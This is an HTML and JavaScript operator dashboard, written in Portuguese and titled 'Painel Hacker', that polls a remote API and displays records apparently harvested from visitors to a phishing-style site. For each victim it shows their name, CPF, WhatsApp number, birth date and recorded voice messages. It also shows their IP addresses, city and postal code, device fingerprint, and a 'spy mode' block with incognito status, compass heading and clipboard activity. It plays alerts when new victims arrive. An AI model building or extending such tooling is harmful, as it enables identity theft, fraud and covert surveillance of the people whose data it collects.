<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PAINEL // ACESSO RESTRITO</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Consolas', 'Courier New', monospace;
      background: #000; color: #00ff41; padding: 20px;
      min-height: 100vh; text-shadow: 0 0 5px rgba(0,255,65,0.7);
    }
    .terminal-bar {
      background: #0a0a0a; border: 1px solid #00ff41;
      border-radius: 8px 8px 0 0; padding: 8px 14px;
      display: flex; align-items: center; gap: 8px;
      font-size: 12px; margin-bottom: -1px;
    }
    .dot-vermelho, .dot-amarelo, .dot-verde {
      width: 12px; height: 12px; border-radius: 50%; display: inline-block;
    }
    .dot-vermelho { background: #ff5f56; }
    .dot-amarelo { background: #ffbd2e; }
    .dot-verde { background: #27c93f; }
    .terminal-titulo { margin-left: 10px; color: #00ff41; font-size: 12px; letter-spacing: 1px; }
    .header {
      border: 1px solid #00ff41; border-radius: 0 0 8px 8px;
      padding: 18px; margin-bottom: 20px;
      display: flex; justify-content: space-between; align-items: center;
      flex-wrap: wrap; gap: 12px;
      background: rgba(0,255,65,0.03);
    }
    h1 { font-size: 20px; letter-spacing: 2px; text-transform: uppercase; }
    h1::before { content: '> '; }
    h1::after { content: '_'; animation: blink 1s infinite; }
    @keyframes blink { 0%,50%{opacity:1;} 51%,100%{opacity:0;} }
    .status { font-size: 13px; color: #00ff41; letter-spacing: 1px; }
    #btnSom {
      padding: 8px 14px; border: 1px solid #ffc800;
      background: transparent; color: #ffc800;
      border-radius: 4px; font-size: 12px; cursor: pointer;
      font-weight: 600; font-family: inherit; letter-spacing: 1px;
      transition: all 0.2s;
    }
    #btnSom:hover { background: #ffc800; color: #000; box-shadow: 0 0 15px #ffc800; }
    #btnSom.ativo {
      background: #ffc800; color: #000;
      box-shadow: 0 0 15px #ffc800;
      animation: pulseSom 2s infinite;
    }
    @keyframes pulseSom {
      0%,100% { box-shadow: 0 0 15px #ffc800; }
      50%     { box-shadow: 0 0 25px #ffc800, 0 0 35px #ffc800; }
    }
    .dot {
      display: inline-block; width: 9px; height: 9px;
      border-radius: 50%; background: #00ff41; margin-right: 6px;
      box-shadow: 0 0 8px #00ff41;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
    .cards-top { display: flex; gap: 14px; flex-wrap: wrap; margin-bottom: 20px; }
    .card-top {
      background: #050505; border: 1px solid #00ff41;
      padding: 18px; border-radius: 6px;
      flex: 1; min-width: 150px;
      box-shadow: 0 0 15px rgba(0,255,65,0.2);
      position: relative; overflow: hidden;
      transition: all 0.3s;
    }
    .card-top::before {
      content: ''; position: absolute; top: 0; left: 0;
      width: 100%; height: 2px;
      background: linear-gradient(90deg, transparent, #00ff41, transparent);
      animation: scan 3s linear infinite;
    }
    @keyframes scan { 0%{transform:translateX(-100%);} 100%{transform:translateX(100%);} }
    .card-top.flash { animation: flashCard 1s ease; }
    @keyframes flashCard {
      0%   { background: #050505; box-shadow: 0 0 15px rgba(0,255,65,0.2); transform: scale(1); }
      30%  { background: #00ff41; box-shadow: 0 0 40px #00ff41, 0 0 60px #00ff41; transform: scale(1.05); }
      100% { background: #050505; box-shadow: 0 0 15px rgba(0,255,65,0.2); transform: scale(1); }
    }
    .card-top.flash .num, .card-top.flash .lbl { color: #000; }
    .card-top .num { font-size: 32px; font-weight: bold; color: #00ff41; text-shadow: 0 0 10px #00ff41; }
    .card-top .lbl { font-size: 11px; color: #00aa2b; text-transform: uppercase; margin-top: 6px; letter-spacing: 1.5px; }
    .controles { display: flex; gap: 10px; margin-bottom: 14px; flex-wrap: wrap; }
    button {
      padding: 9px 16px; border: 1px solid #00ff41;
      background: transparent; color: #00ff41;
      border-radius: 4px; font-size: 13px; cursor: pointer;
      font-weight: 600; font-family: inherit;
      letter-spacing: 1px; text-transform: uppercase;
      transition: all 0.2s;
    }
    button:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px #00ff41; }
    .btn-del-all { border-color: #ff3b3b; color: #ff3b3b; }
    .btn-del-all:hover { background: #ff3b3b; color: #000; box-shadow: 0 0 15px #ff3b3b; }
    .btn-del { border-color: #ff3b3b; color: #ff3b3b; padding: 5px 12px; font-size: 11px; }
    .btn-del:hover { background: #ff3b3b; color: #000; box-shadow: 0 0 15px #ff3b3b; }
    .busca {
      width: 100%; padding: 11px; background: #050505;
      border: 1px solid #00ff41; border-radius: 4px;
      font-size: 14px; margin-bottom: 14px;
      color: #00ff41; font-family: inherit; letter-spacing: 1px;
    }
    .busca::placeholder { color: #00aa2b; }
    .busca:focus { outline: none; box-shadow: 0 0 15px rgba(0,255,65,0.4); }
    .lista { display: flex; flex-direction: column; gap: 14px; }
    .cadastro {
      background: #050505; border: 1px solid #00ff41;
      border-radius: 6px; overflow: hidden;
      box-shadow: 0 0 15px rgba(0,255,65,0.15);
    }
    .cadastro-header {
      display: flex; justify-content: space-between;
      align-items: center; gap: 10px;
      padding: 14px 18px;
      background: rgba(0,255,65,0.08);
      border-bottom: 1px solid #00ff41; flex-wrap: wrap;
    }
    .cadastro-nome {
      font-size: 16px; font-weight: bold; color: #00ff41;
      letter-spacing: 1px; text-shadow: 0 0 8px rgba(0,255,65,0.6);
    }
    .cadastro-nome::before { content: '[USER] '; color: #00aa2b; font-size: 12px; }
    .cadastro-data { font-size: 11px; color: #00aa2b; letter-spacing: 1px; }
    .bloco-titulo {
      padding: 8px 18px; background: rgba(0,255,65,0.12);
      font-size: 11px; font-weight: 700;
      text-transform: uppercase; color: #00ff41;
      letter-spacing: 2px; border-bottom: 1px solid #00ff41;
    }
    .bloco-titulo::before { content: '$ '; }
    .bloco-device .bloco-titulo { background: rgba(0,180,255,0.12); color: #00b4ff; border-bottom: 1px solid #00b4ff; }
    .bloco-bateria .bloco-titulo { background: rgba(255,200,0,0.12); color: #ffc800; border-bottom: 1px solid #ffc800; }
    .bloco-hw .bloco-titulo { background: rgba(200,0,255,0.12); color: #d966ff; border-bottom: 1px solid #d966ff; }
    .bloco-loc .bloco-titulo { background: rgba(255,0,120,0.12); color: #ff0078; border-bottom: 1px solid #ff0078; }
    .bloco-origem .bloco-titulo { background: rgba(255,140,0,0.12); color: #ff8c00; border-bottom: 1px solid #ff8c00; }
    .bloco-espiao .bloco-titulo { background: rgba(255,50,50,0.15); color: #ff3232; border-bottom: 1px solid #ff3232; }
    .bloco-audio .bloco-titulo { background: rgba(0,255,180,0.15); color: #00ffb4; border-bottom: 1px solid #00ffb4; }
    .cadastro-body {
      padding: 16px 18px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 14px;
    }
    .campo { font-size: 13px; }
    .campo .rotulo {
      color: #00aa2b; font-size: 10px;
      text-transform: uppercase; font-weight: 600;
      margin-bottom: 3px; letter-spacing: 1.5px;
    }
    .campo .rotulo::before { content: '> '; }
    .campo .valor { color: #00ff41; word-break: break-word; font-size: 14px; }
    .bloco-device .campo .rotulo { color: #0088bb; }
    .bloco-device .campo .valor { color: #00b4ff; text-shadow: 0 0 5px rgba(0,180,255,0.7); }
    .bloco-bateria .campo .rotulo { color: #aa8800; }
    .bloco-bateria .campo .valor { color: #ffc800; text-shadow: 0 0 5px rgba(255,200,0,0.7); }
    .bloco-hw .campo .rotulo { color: #8800aa; }
    .bloco-hw .campo .valor { color: #d966ff; text-shadow: 0 0 5px rgba(200,0,255,0.7); }
    .bloco-loc .campo .rotulo { color: #aa0055; }
    .bloco-loc .campo .valor { color: #ff0078; text-shadow: 0 0 5px rgba(255,0,120,0.7); }
    .bloco-origem .campo .rotulo { color: #aa5500; }
    .bloco-origem .campo .valor { color: #ff8c00; text-shadow: 0 0 5px rgba(255,140,0,0.7); }
    .bloco-espiao .campo .rotulo { color: #aa2222; }
    .bloco-espiao .campo .valor { color: #ff3232; text-shadow: 0 0 5px rgba(255,50,50,0.7); }
    .bloco-audio .campo .rotulo { color: #00aa77; }
    .bloco-audio .campo .valor { color: #00ffb4; text-shadow: 0 0 5px rgba(0,255,180,0.7); }

    .audio-player {
      grid-column: 1 / -1;
      background: rgba(0,255,180,0.05);
      border: 1px solid #00ffb4;
      border-radius: 6px;
      padding: 14px;
      display: flex;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    .audio-player audio {
      flex: 1;
      min-width: 200px;
      filter: hue-rotate(120deg);
    }
    .audio-icone {
      font-size: 30px;
      animation: pulseAudio 2s infinite;
    }
    @keyframes pulseAudio {
      0%,100% { transform: scale(1); }
      50%     { transform: scale(1.1); }
    }
    .btn-baixar-audio {
      padding: 6px 12px;
      font-size: 11px;
      border-color: #00ffb4;
      color: #00ffb4;
    }
    .btn-baixar-audio:hover {
      background: #00ffb4;
      color: #000;
      box-shadow: 0 0 15px #00ffb4;
    }

    .vazio {
      text-align: center; padding: 40px; color: #00aa2b;
      letter-spacing: 2px; border: 1px dashed #00aa2b; border-radius: 6px;
    }
    .botoes-card {
      padding: 10px 18px; border-top: 1px solid #00ff41;
      display: flex; justify-content: flex-end;
    }
    #avisoTopo {
      display: none;
      position: fixed;
      top: 20px; left: 50%;
      transform: translateX(-50%);
      padding: 15px 30px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      letter-spacing: 2px;
      z-index: 9999;
      text-transform: uppercase;
      animation: slideDown 0.4s ease;
      box-shadow: 0 0 30px currentColor;
    }
    @keyframes slideDown {
      from { opacity: 0; transform: translate(-50%, -30px); }
      to   { opacity: 1; transform: translate(-50%, 0); }
    }
    #avisoTopo.aviso-clique { background: #00ff41; color: #000; border: 2px solid #00ff41; }
    #avisoTopo.aviso-cadastro { background: #ffc800; color: #000; border: 2px solid #ffc800; font-size: 20px; }
    ::-webkit-scrollbar { width: 10px; height: 10px; }
    ::-webkit-scrollbar-track { background: #000; }
    ::-webkit-scrollbar-thumb { background: #00aa2b; border-radius: 5px; }
    ::-webkit-scrollbar-thumb:hover { background: #00ff41; }
  </style>
</head>
<body>

  <div id="avisoTopo"></div>

  <div class="terminal-bar">
    <span class="dot-vermelho"></span>
    <span class="dot-amarelo"></span>
    <span class="dot-verde"></span>
    <span class="terminal-titulo">root@gets-invio-on:~$ ./painel.sh</span>
  </div>

  <div class="header">
    <h1>Painel Hacker</h1>
    <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
      <button id="btnSom" onclick="ativarSom()">[ 🔇 ATIVAR SOM ]</button>
      <div class="status"><span class="dot"></span>SYSTEM ONLINE // AUTO-REFRESH 5s</div>
    </div>
  </div>

  <div class="cards-top">
    <div class="card-top" id="cardVisitas">
      <div class="num" id="total-visitas">0</div>
      <div class="lbl">Cliques</div>
    </div>
    <div class="card-top" id="cardVisitasHoje">
      <div class="num" id="visitas-hoje">0</div>
      <div class="lbl">Cliques hoje</div>
    </div>
    <div class="card-top" id="cardTotal">
      <div class="num" id="total">0</div>
      <div class="lbl">Total de cadastros</div>
    </div>
    <div class="card-top" id="cardHoje">
      <div class="num" id="hoje">0</div>
      <div class="lbl">Cadastros hoje</div>
    </div>
  </div>

  <div class="controles">
    <button class="btn-refresh" onclick="carregarTudo()">[ REFRESH ]</button>
    <button class="btn-del-all" onclick="apagarTudo()">[ DELETE ALL ]</button>
  </div>

  <input id="busca" class="busca" type="text" placeholder="> grep search..." oninput="filtrar()" />

  <div class="lista" id="lista"></div>

  <script>
    const API_URL = 'https://gets-invio-on-api.onrender.com';
    let todosDados = [];
    let audioCtx = null;
    let somAtivo = false;
    let blobsAudio = {};  // Cache de blob URLs pra não recriar

    function ativarSom() {
      try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        somAtivo = true;
        document.getElementById('btnSom').textContent = '[ 🔊 SOM ATIVO ]';
        document.getElementById('btnSom').classList.add('ativo');
        tocarTom(880, 0.1);
        setTimeout(function() { tocarTom(1100, 0.15); }, 120);
      } catch (e) { alert('Seu navegador não suporta áudio!'); }
    }

    function tocarTom(freq, duracao, tipo, volume) {
      if (!somAtivo || !audioCtx) return;
      tipo = tipo || 'sine';
      volume = volume || 0.3;
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.connect(gain); gain.connect(audioCtx.destination);
      osc.type = tipo; osc.frequency.value = freq;
      gain.gain.setValueAtTime(volume, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duracao);
      osc.start(); osc.stop(audioCtx.currentTime + duracao);
    }

    function somClique() {
      tocarTom(1300, 0.1);
      setTimeout(function() { tocarTom(1600, 0.12); }, 130);
    }
    function somCadastro() {
      tocarTom(800, 0.15, 'triangle', 0.4);
      setTimeout(function() { tocarTom(1000, 0.15, 'triangle', 0.4); }, 180);
      setTimeout(function() { tocarTom(1300, 0.25, 'triangle', 0.4); }, 360);
    }

    function mostrarAviso(texto, tipo) {
      const el = document.getElementById('avisoTopo');
      el.textContent = texto;
      el.className = tipo === 'cadastro' ? 'aviso-cadastro' : 'aviso-clique';
      el.style.display = 'block';
      clearTimeout(el._timer);
      el._timer = setTimeout(function() { el.style.display = 'none'; }, 4000);
    }

    function flashCard(id) {
      const el = document.getElementById(id);
      if (!el) return;
      el.classList.add('flash');
      setTimeout(function() { el.classList.remove('flash'); }, 1000);
    }

    let ultimoTotalVisitas = null;
    let ultimoTotalCadastros = null;

    async function carregarVisitas() {
      try {
        const r = await fetch(API_URL + '/visitas');
        const j = await r.json();
        if (ultimoTotalVisitas !== null && j.total > ultimoTotalVisitas) {
          somClique(); flashCard('cardVisitas');
          mostrarAviso('👆 Novo clique no site!', 'clique');
        }
        ultimoTotalVisitas = j.total;
        document.getElementById('total-visitas').textContent = j.total;
        document.getElementById('visitas-hoje').textContent = j.hoje;
      } catch (e) {
        document.getElementById('total-visitas').textContent = '-';
        document.getElementById('visitas-hoje').textContent = '-';
      }
    }

    async function carregar() {
      try {
        const r = await fetch(API_URL + '/dados');
        const j = await r.json();
        const dados = j.dados || [];
        todosDados = dados;
        if (ultimoTotalCadastros !== null && dados.length > ultimoTotalCadastros) {
          somCadastro(); flashCard('cardTotal'); flashCard('cardHoje');
          mostrarAviso('🚨 Novo cadastro recebido!', 'cadastro');
        }
        ultimoTotalCadastros = dados.length;
        document.getElementById('total').textContent = dados.length;
        const hoje = new Date().toDateString();
        const doDia = dados.filter(function(d) { return new Date(d.recebidoEm).toDateString() === hoje; });
        document.getElementById('hoje').textContent = doDia.length;
        renderizar(dados);
      } catch (e) {
        document.getElementById('lista').innerHTML =
          '<div class="vazio">[!] CONEXAO FALHOU — servidor offline?</div>';
      }
    }

    function carregarTudo() { carregarVisitas(); carregar(); }

    function filtrar() {
      const termo = document.getElementById('busca').value.toLowerCase().trim();
      if (!termo) { renderizar(todosDados); return; }
      const filtrado = todosDados.filter(function(d) {
        return (d.nome || '').toLowerCase().indexOf(termo) !== -1 ||
          (d.whatsapp || '').toLowerCase().indexOf(termo) !== -1 ||
          (d.cpf || '').toLowerCase().indexOf(termo) !== -1 ||
          (d.localizacao && d.localizacao.cidade || '').toLowerCase().indexOf(termo) !== -1 ||
          (d.origem || '').toLowerCase().indexOf(termo) !== -1;
      });
      renderizar(filtrado);
    }

    function esc(s) {
      return String(s == null ? '-' : s).replace(/[&<>"']/g, function(c) {
        return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
      });
    }

    function formatarData(iso) {
      if (!iso) return '-';
      if (/^\d{4}-\d{2}-\d{2}$/.test(iso)) {
        const partes = iso.split('-');
        return partes[2] + '/' + partes[1] + '/' + partes[0];
      }
      return iso;
    }

    // ====== CONVERTE BASE64 EM BLOB URL ======
    function base64ParaBlobUrl(dataUrl) {
      // Se já foi convertido, retorna do cache
      if (blobsAudio[dataUrl]) return blobsAudio[dataUrl];

      try {
        // Separa "data:audio/wav;base64,..."
        const partes = dataUrl.split(',');
        const mimeMatch = partes[0].match(/:(.*?);/);
        const mime = mimeMatch ? mimeMatch[1] : 'audio/wav';
        const b64 = partes[1];

        // Converte base64 → binário
        const bin = atob(b64);
        const arr = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) {
          arr[i] = bin.charCodeAt(i);
        }

        // Cria Blob e URL
        const blob = new Blob([arr], { type: mime });
        const url = URL.createObjectURL(blob);
        blobsAudio[dataUrl] = url;
        return url;
      } catch (e) {
        console.log('Erro convertendo áudio:', e);
        return dataUrl;
      }
    }

    function iconeSistema(s) {
      if (s === 'Android') return '🤖';
      if (s === 'iOS') return '🍎';
      if (s === 'Windows') return '🪟';
      if (s === 'MacOS') return '🍏';
      if (s === 'Linux') return '🐧';
      return '❓';
    }
    function iconeTipo(t) {
      if (t === 'Celular') return '📱';
      if (t === 'Tablet') return '📟';
      if (t === 'PC') return '💻';
      return '❓';
    }
    function iconeBateria(nivel) {
      if (nivel === null || nivel === undefined) return '🔌';
      if (nivel >= 50) return '🔋';
      return '🪫';
    }
    function formatarConexao(c) {
      if (!c) return 'N/A';
      if (c === '4g') return '⚡ Rápida';
      if (c === '3g') return '📶 Média';
      if (c === '2g') return '🐢 Lenta';
      if (c === 'slow-2g') return '🐌 Muito lenta';
      return c.toUpperCase();
    }
    function formatarOrientacao(o) {
      if (!o) return '-';
      if (o.indexOf('portrait') !== -1) return '📱 Retrato';
      if (o.indexOf('landscape') !== -1) return '🔄 Paisagem';
      return o;
    }
    function bandeiraPais(codigo) {
      if (!codigo || codigo.length !== 2) return '🌍';
      const codePoints = codigo.toUpperCase().split('').map(function(c) { return 127397 + c.charCodeAt(0); });
      return String.fromCodePoint.apply(null, codePoints);
    }
    function iconeOrigem(o) {
      if (!o) return '❓';
      if (o.indexOf('WhatsApp') !== -1) return '💬';
      if (o.indexOf('Instagram') !== -1) return '📷';
      if (o.indexOf('Facebook') !== -1) return '📘';
      if (o.indexOf('TikTok') !== -1) return '🎵';
      if (o.indexOf('Google') !== -1) return '🔍';
      if (o.indexOf('Bing') !== -1) return '🔎';
      if (o.indexOf('YouTube') !== -1) return '▶️';
      if (o.indexOf('Twitter') !== -1) return '🐦';
      if (o.indexOf('Telegram') !== -1) return '✈️';
      if (o.indexOf('LinkedIn') !== -1) return '💼';
      if (o.indexOf('Direto') !== -1) return '⌨️';
      return '🌐';
    }
    function formatarTempo(seg) {
      if (!seg && seg !== 0) return 'N/A';
      if (seg < 60) return seg + ' segundos';
      const min = Math.floor(seg / 60);
      const s = seg % 60;
      return min + ' min ' + s + 's';
    }
    function formatarDirecao(graus) {
      if (graus == null) return 'N/A';
      const direcoes = ['Norte ⬆️','Nordeste ↗️','Leste ➡️','Sudeste ↘️','Sul ⬇️','Sudoeste ↙️','Oeste ⬅️','Noroeste ↖️'];
      const idx = Math.round(graus / 45) % 8;
      return direcoes[idx] + ' (' + graus + '°)';
    }

    function renderizar(dados) {
      if (dados.length === 0) {
        document.getElementById('lista').innerHTML =
          '<div class="vazio">[ NENHUM REGISTRO ENCONTRADO ]</div>';
        return;
      }

      let html = '';

      for (let i = dados.length - 1; i >= 0; i--) {
        const d = dados[i];
        const dev = d.dispositivo || {};
        const loc = d.localizacao || null;

        const blocoDevice =
          '<div class="bloco-device">' +
            '<div class="bloco-titulo">DISPOSITIVO</div>' +
            '<div class="cadastro-body">' +
              '<div class="campo"><div class="rotulo">Sistema</div><div class="valor">' + iconeSistema(dev.sistema) + ' ' + esc(dev.sistema) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Navegador</div><div class="valor">🌐 ' + esc(dev.navegador) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Tipo</div><div class="valor">' + iconeTipo(dev.tipo) + ' ' + esc(dev.tipo) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Idioma</div><div class="valor">🗣️ ' + esc(dev.idioma) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Tela</div><div class="valor">📐 ' + esc(dev.tela) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Fuso horário</div><div class="valor">🕒 ' + esc(dev.fuso) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Orientação</div><div class="valor">' + formatarOrientacao(dev.orientacao) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Pixel ratio</div><div class="valor">' + esc(dev.pixelRatio || 1) + 'x</div></div>' +
              '<div class="campo"><div class="rotulo">Touchscreen</div><div class="valor">' + (dev.touch ? '👆 Sim' : '❌ Não') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Cookies</div><div class="valor">' + (dev.cookies ? '🍪 Sim' : '❌ Não') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Hora do cliente</div><div class="valor">🕐 ' + esc(dev.horaCliente) + '</div></div>' +
            '</div>' +
          '</div>';

        const blocoBateria =
          '<div class="bloco-bateria">' +
            '<div class="bloco-titulo">BATERIA & CONEXÃO</div>' +
            '<div class="cadastro-body">' +
              '<div class="campo"><div class="rotulo">Bateria</div><div class="valor">' + iconeBateria(dev.bateria && dev.bateria.nivel) + ' ' + (dev.bateria ? dev.bateria.nivel + '%' : 'N/A') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Carregando?</div><div class="valor">' + (dev.bateria ? (dev.bateria.carregando ? '⚡ Sim' : '❌ Não') : 'N/A') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Tempo pra carregar</div><div class="valor">' + (dev.bateria && dev.bateria.tempoCarregar ? '⏱️ ' + dev.bateria.tempoCarregar + ' min' : 'N/A') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Tempo restante</div><div class="valor">' + (dev.bateria && dev.bateria.tempoDescarregar ? '⏳ ' + dev.bateria.tempoDescarregar + ' min' : 'N/A') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Velocidade</div><div class="valor">' + formatarConexao(dev.conexao) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Tipo de conexão</div><div class="valor">' + (dev.tipoConexao ? '📡 ' + esc(dev.tipoConexao) : 'N/A') + '</div></div>' +
            '</div>' +
          '</div>';

        const blocoHW =
          '<div class="bloco-hw">' +
            '<div class="bloco-titulo">HARDWARE</div>' +
            '<div class="cadastro-body">' +
              '<div class="campo"><div class="rotulo">RAM estimada</div><div class="valor">🧠 ' + (dev.ram ? dev.ram + ' GB' : 'N/A') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Núcleos CPU</div><div class="valor">⚙️ ' + (dev.nucleos || 'N/A') + '</div></div>' +
              '<div class="campo"><div class="rotulo">GPU</div><div class="valor">🎮 ' + esc(dev.gpu) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Profundidade de cor</div><div class="valor">🎨 ' + (dev.corProfundidade ? dev.corProfundidade + ' bits' : 'N/A') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Espaço em disco</div><div class="valor">' + (dev.storage ? '💾 ' + dev.storage.quota + ' MB' : 'N/A') + '</div></div>' +
            '</div>' +
          '</div>';

        let blocoLoc = '';
        if (loc) {
          blocoLoc =
            '<div class="bloco-loc">' +
              '<div class="bloco-titulo">LOCALIZAÇÃO & IP</div>' +
              '<div class="cadastro-body">' +
                '<div class="campo"><div class="rotulo">IP público</div><div class="valor">🌐 ' + esc(d.ip) + '</div></div>' +
                '<div class="campo"><div class="rotulo">IP local (rede)</div><div class="valor">' + (dev.ipLocal ? '🏠 ' + esc(dev.ipLocal) : 'N/A') + '</div></div>' +
                '<div class="campo"><div class="rotulo">País</div><div class="valor">' + bandeiraPais(loc.codigoPais) + ' ' + esc(loc.pais) + '</div></div>' +
                '<div class="campo"><div class="rotulo">Estado / Região</div><div class="valor">🗺️ ' + esc(loc.regiao) + '</div></div>' +
                '<div class="campo"><div class="rotulo">Cidade</div><div class="valor">🏙️ ' + esc(loc.cidade) + '</div></div>' +
                '<div class="campo"><div class="rotulo">CEP</div><div class="valor">📮 ' + esc(loc.cep) + '</div></div>' +
                '<div class="campo"><div class="rotulo">Operadora</div><div class="valor">📡 ' + esc(loc.operadora) + '</div></div>' +
              '</div>' +
            '</div>';
        }

        const blocoOrigem =
          '<div class="bloco-origem">' +
            '<div class="bloco-titulo">ORIGEM & COMPORTAMENTO</div>' +
            '<div class="cadastro-body">' +
              '<div class="campo"><div class="rotulo">Veio de onde</div><div class="valor">' + iconeOrigem(d.origem) + ' ' + esc(d.origem) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Já visitou antes</div><div class="valor">' + (d.jaVisitou ? '🔁 Sim (recorrente)' : '🆕 Primeira vez') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Tempo de preenchimento</div><div class="valor">⏱️ ' + formatarTempo(d.tempoPreenchimento) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Tempo parado</div><div class="valor">⏸️ ' + formatarTempo(d.tempoFora) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Copiou algo?</div><div class="valor">' + (d.copiouAlgo ? '📋 Sim (Ctrl+C)' : '❌ Não') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Velocidade de digitação</div><div class="valor">⌨️ ' + (d.velocidadeDigitacao ? d.velocidadeDigitacao + ' teclas/min' : 'N/A') + '</div></div>' +
            '</div>' +
          '</div>';

        const blocoEspiao =
          '<div class="bloco-espiao">' +
            '<div class="bloco-titulo">🕵️ MODO ESPIÃO</div>' +
            '<div class="cadastro-body">' +
              '<div class="campo"><div class="rotulo">Modo anônimo?</div><div class="valor">' + (dev.incognito ? '🕶️ Sim (aba privada)' : '❌ Não (aba normal)') + '</div></div>' +
              '<div class="campo"><div class="rotulo">Bússola</div><div class="valor">🧭 ' + formatarDirecao(dev.bussola) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Rede corporativa?</div><div class="valor">' + (dev.ipLocal && (dev.ipLocal.indexOf('10.') === 0 || dev.ipLocal.indexOf('172.') === 0 || dev.ipLocal.indexOf('192.168.') === 0) ? '🏢 Possível rede interna' : '🌐 Rede pública') + '</div></div>' +
            '</div>' +
          '</div>';

        // BLOCO DE ÁUDIO com conversão pra blob
        let blocoAudio = '';
        if (d.audio) {
          // ⚡ CONVERTE BASE64 → BLOB URL (resolve o corte)
          const audioSrc = base64ParaBlobUrl(d.audio);
          blocoAudio =
            '<div class="bloco-audio">' +
              '<div class="bloco-titulo">🎙️ MENSAGEM DE VOZ</div>' +
              '<div class="cadastro-body">' +
                '<div class="audio-player">' +
                  '<div class="audio-icone">🎙️</div>' +
                  '<audio controls preload="metadata" src="' + audioSrc + '"></audio>' +
                  '<button class="btn-baixar-audio" onclick="baixarAudio(\'' + d.id + '\', \'' + esc(d.nome) + '\')">[ BAIXAR ]</button>' +
                '</div>' +
                '<div class="campo"><div class="rotulo">Duração</div><div class="valor">⏱️ ' + (d.audioDuracao || 0) + ' segundos</div></div>' +
              '</div>' +
            '</div>';
        } else {
          blocoAudio =
            '<div class="bloco-audio">' +
              '<div class="bloco-titulo">🎙️ MENSAGEM DE VOZ</div>' +
              '<div class="cadastro-body">' +
                '<div class="campo"><div class="rotulo">Status</div><div class="valor">❌ Cliente não deixou áudio</div></div>' +
              '</div>' +
            '</div>';
        }

        let blocoDados = '';
        if (d.dispositivo) {
          blocoDados = blocoDevice + blocoBateria + blocoHW;
        }

        let blocoEspiaoFinal = '';
        if (d.dispositivo) {
          blocoEspiaoFinal = blocoEspiao;
        }

        html +=
          '<div class="cadastro">' +
            '<div class="cadastro-header">' +
              '<div class="cadastro-nome">' + esc(d.nome) + '</div>' +
              '<div class="cadastro-data">' + new Date(d.recebidoEm).toLocaleString('pt-BR') + '</div>' +
            '</div>' +
            '<div class="bloco-titulo">DADOS DO LOGIN</div>' +
            '<div class="cadastro-body">' +
              '<div class="campo"><div class="rotulo">Nome completo</div><div class="valor">' + esc(d.nome) + '</div></div>' +
              '<div class="campo"><div class="rotulo">CPF</div><div class="valor">' + esc(d.cpf) + '</div></div>' +
              '<div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">' + esc(d.whatsapp) + '</div></div>' +
              '<div class="campo"><div class="rotulo">Data de nascimento</div><div class="valor">' + formatarData(d.dataNascimento) + '</div></div>' +
            '</div>' +
            blocoAudio +
            blocoDados +
            blocoLoc +
            blocoOrigem +
            blocoEspiaoFinal +
            '<div class="botoes-card">' +
              '<button class="btn-del" onclick="apagar(' + d.id + ')">[ DELETE ]</button>' +
            '</div>' +
          '</div>';
      }

      document.getElementById('lista').innerHTML = html;
    }

    function baixarAudio(id, nome) {
      const d = todosDados.find(function(x) { return String(x.id) === String(id); });
      if (!d || !d.audio) return;

      // Converte pra blob URL se ainda não fez
      const src = base64ParaBlobUrl(d.audio);

      const a = document.createElement('a');
      a.href = src;
      a.download = 'audio-' + nome.replace(/[^a-z0-9]/gi, '_') + '.wav';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    async function apagar(id) {
      if (!confirm('DELETAR esse cadastro?')) return;
      await fetch(API_URL + '/dados/' + id, { method: 'DELETE' });
      carregar();
    }

    async function apagarTudo() {
      if (!confirm('⚠️ DELETAR TODOS os cadastros? Sem volta!')) return;
      await fetch(API_URL + '/dados', { method: 'DELETE' });
      carregarTudo();
    }

    carregarVisitas();
    carregar();
    setInterval(function() { carregarVisitas(); carregar(); }, 5000);
  </script>
</body>
</html>
